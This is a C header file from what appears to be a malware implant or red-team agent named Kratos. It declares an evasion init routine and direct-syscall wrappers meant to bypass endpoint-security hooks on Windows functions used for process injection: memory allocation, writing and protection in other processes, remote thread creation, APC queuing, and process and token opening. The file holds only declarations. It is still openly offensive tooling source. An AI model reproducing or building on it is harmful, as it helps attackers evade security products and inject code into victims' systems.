#pragma once
#include <windows.h>

/* Called once at agent startup. Each technique is compiled only if its
 * own define is present. The function itself is always generated.     */
void kratos_evasion_init(void);

/* ---- Direct syscall API (only available when EVASION_SYSCALLS) ---- */
#ifdef EVASION_SYSCALLS
#include <ntstatus.h>
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/* SSN resolvers */
DWORD    kratos_resolve_ssn(const char *func_name);
DWORD    kratos_resolve_ssn_hash(DWORD hash);

/* .S GAS stub: wSystemCall in .data, do_syscall in .text (no RWX, no heap) */
extern DWORD wSystemCall;
extern void  do_syscall(void);

/* Wrappers around frequently-hooked Nt* functions */
NTSTATUS kratos_NtAllocateVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                        ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                        ULONG AllocationType, ULONG Protect);

NTSTATUS kratos_NtProtectVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                       PSIZE_T RegionSize, ULONG NewProtect,
                                       PULONG OldProtect);

NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                 PVOID ObjectAttributes, HANDLE ProcessHandle,
                                 PVOID StartRoutine, PVOID Argument,
                                 ULONG CreateFlags, SIZE_T ZeroBits,
                                 SIZE_T StackSize, SIZE_T MaximumStackSize,
                                 PVOID AttributeList);

NTSTATUS kratos_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                     PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                     PSIZE_T NumberOfBytesWritten);

NTSTATUS kratos_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine,
                                  PVOID ApcArgument1, PVOID ApcArgument2,
                                  PVOID ApcArgument3);

NTSTATUS kratos_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                               DWORD Pid);

NTSTATUS kratos_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                    PHANDLE TokenHandle);

#endif /* EVASION_SYSCALLS */
